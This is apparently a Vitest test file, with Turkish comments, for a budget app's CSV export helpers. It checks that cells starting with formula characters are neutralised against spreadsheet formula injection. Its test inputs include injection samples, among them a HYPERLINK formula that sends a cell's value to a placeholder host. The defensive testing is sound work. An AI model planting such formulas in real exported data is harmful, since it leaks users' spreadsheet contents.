import { CSV_REVOKE_DELAY_MS, csvCell, downloadCsv, toCsv } from './csv';

// Ortak CSV yardımcısı (Raporlar ve Bütçe dışa aktarımı). Kaynak metni (gözlem etiketi, oda adı, sorun kodu) bağlantıya
// sahip herkesin düzenleyebildiği Sheet'ten gelir: "=", "+", "-", "@", TAB ya da CR ile başlayan hücre tabloda formül
// olarak çalışmasın diye "'" önekiyle metne çevrilir (tırnaklama tek başına korumaz: Excel ve LibreOffice tırnak içindeki
// "=…" alanını da formül sayar). Saf ondalık sayı (eksi tutar dahil) sayı olarak kalır.

describe('csvCell › formül enjeksiyonu', () => {
  it.each([
    ['=1+1', "'=1+1"],
    ['+90', "'+90"],
    ['@SUM(A1:A2)', "'@SUM(A1:A2)"],
    ['-x', "'-x"],
    ['=HYPERLINK("https://ornek.test?"&B2;"tıkla")', `"'=HYPERLINK(""https://ornek.test?""&B2;""tıkla"")"`],
    ['\tgizli', "'\tgizli"],
    ['\r=1+1', `"'\r=1+1"`],
    ['-1250.00 TRY', "'-1250.00 TRY"],
  ])('%j formül olarak çalışmaz → %j', (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it.each([['-1250.00'], ['-7'], ['8500.00'], ['0'], ['Örnek gider satırı 1'], ['Kasım 2026'], ['Henüz yok'], ['']])(
    '%j olduğu gibi kalır (saf ondalık sayı ya da güvenli metin)',
    (input) => {
      expect(csvCell(input)).toBe(input);
    },
  );

  it('ayırıcı, tırnak ve satır sonu içeren hücre tırnaklanır', () => {
    expect(csvCell('Not; "a"')).toBe('"Not; ""a"""');
    expect(csvCell('iki\nsatır')).toBe('"iki\nsatır"');
  });
});

describe('toCsv', () => {
  it('noktalı virgülle ayırır, CRLF ile satırlar, UTF-8 BOM ile başlar; her hücre csvCell kuralından geçer', () => {
    const csv = toCsv([['Kalem', 'Fark'], ['=1+1', '-1250.00'], ['Not; "a"', 'Henüz yok']]);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
    expect(csv.slice(1)).toBe(`Kalem;Fark\r\n'=1+1;-1250.00\r\n"Not; ""a""";Henüz yok`);
  });
});

describe('downloadCsv', () => {
  afterEach(() => {
    vi.useRealTimers();
    vi.restoreAllMocks();
  });

  it('bağlantıyı belgeye ekleyip tıklar, sonra kaldırır; blob URL indirme başladıktan sonra (ertelenerek) bırakılır', () => {
    vi.useFakeTimers();
    const blobs: Blob[] = [];
    const createObjectURL = vi.fn((blob: Blob) => { blobs.push(blob); return 'blob:aile-csv'; });
    const revokeObjectURL = vi.fn();
    Object.defineProperty(URL, 'createObjectURL', { configurable: true, writable: true, value: createObjectURL });
    Object.defineProperty(URL, 'revokeObjectURL', { configurable: true, writable: true, value: revokeObjectURL });
    let connected = false;
    const click = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(function (this: HTMLAnchorElement) {
      connected = this.isConnected;
      expect(this.download).toBe('butce-2026-11.csv');
      expect(this.href).toBe('blob:aile-csv');
    });

    downloadCsv('butce-2026-11.csv', [['Kalem'], ['=1+1']]);

    expect(click).toHaveBeenCalledTimes(1);
    expect(connected).toBe(true);
    expect(document.querySelector('a[download]')).toBeNull();
    expect(blobs[0]!.type).toBe('text/csv;charset=utf-8');
    expect(revokeObjectURL).not.toHaveBeenCalled();
    vi.advanceTimersByTime(CSV_REVOKE_DELAY_MS - 1);
    expect(revokeObjectURL).not.toHaveBeenCalled();
    vi.advanceTimersByTime(1);
    expect(revokeObjectURL).toHaveBeenCalledWith('blob:aile-csv');
  });

  it('içerik toCsv ile üretilir (formül koruması dahil)', async () => {
    const blobs: Blob[] = [];
    Object.defineProperty(URL, 'createObjectURL', { configurable: true, writable: true, value: vi.fn((blob: Blob) => { blobs.push(blob); return 'blob:x'; }) });
    Object.defineProperty(URL, 'revokeObjectURL', { configurable: true, writable: true, value: vi.fn() });
    vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
    downloadCsv('x.csv', [['Kalem', 'Tutar'], ['@SUM(A1)', '-5.00']]);
    // Blob.text() UTF-8 çözerken BOM'u atabilir; içerik BOM'suz karşılaştırılır, BOM toCsv testinde sınanır.
    const text = (await blobs[0]!.text()).replace(/^\uFEFF/, '');
    expect(text).toBe(toCsv([['Kalem', 'Tutar'], ['@SUM(A1)', '-5.00']]).slice(1));
    expect(text).toBe("Kalem;Tutar\r\n'@SUM(A1);-5.00");
  });
});
